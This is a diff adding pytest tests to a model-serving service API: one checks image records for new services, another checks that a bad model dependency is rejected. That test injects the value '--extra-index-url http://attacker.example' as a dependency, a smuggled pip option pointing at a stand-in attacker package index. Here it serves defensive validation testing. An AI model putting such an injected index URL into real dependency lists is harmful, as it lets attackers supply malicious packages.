@@ -4,7 +4,7 @@ import time
 import pytest
 import requests
 
-from triton_serve.database.model import DesiredState, Device, RuntimeStatus, Service
+from triton_serve.database.model import DesiredState, Device, Model, RuntimeStatus, Service
 from triton_serve.tasks import update_service_status
 
 LOG = logging.getLogger(pytest.__name__)
@@ -429,3 +429,41 @@ def test_budget_returns_after_sustained_ready(test_db, test_docker, test_setting
     assert svc.restart_attempts == 0
     assert svc.last_attempt_at is None
     assert svc.runtime_status == RuntimeStatus.READY
+
+
+RESOURCES = {"gpus": 0, "shm_size": 256, "mem_size": 1024}
+
+
+@pytest.mark.order(after="test_create_service")
+def test_created_service_gets_an_image_row(test_client, test_db):
+    response = test_client.post(
+        "/services",
+        json={"name": "trt-srv_test_img1", "models": ["onnx"], "resources": RESOURCES, "timeout": 3600},
+    )
+    assert response.status_code == 201, response.text
+    service_id = response.json()["service_id"]
+    try:
+        test_db.expire_all()
+        service = test_db.get(Service, ident=service_id)
+        assert service.image is not None
+        assert service.image_hash == service.image.image_hash
+        assert service.image.base_image == service.service_image
+    finally:
+        test_client.delete(f"/services/{service_id}")
+
+
+@pytest.mark.order(after="test_create_service")
+def test_invalid_dependency_is_rejected_at_write_time(test_client, test_db):
+    model = test_db.query(Model).filter(Model.model_name == "onnx").one()
+    original = list(model.dependencies or [])
+    model.dependencies = ["--extra-index-url http://attacker.example"]
+    test_db.commit()
+    try:
+        response = test_client.post(
+            "/services",
+            json={"name": "trt-srv_test_img2", "models": ["onnx"], "resources": RESOURCES, "timeout": 3600},
+        )
+        assert response.status_code == 422, response.text
+    finally:
+        model.dependencies = original
+        test_db.commit()
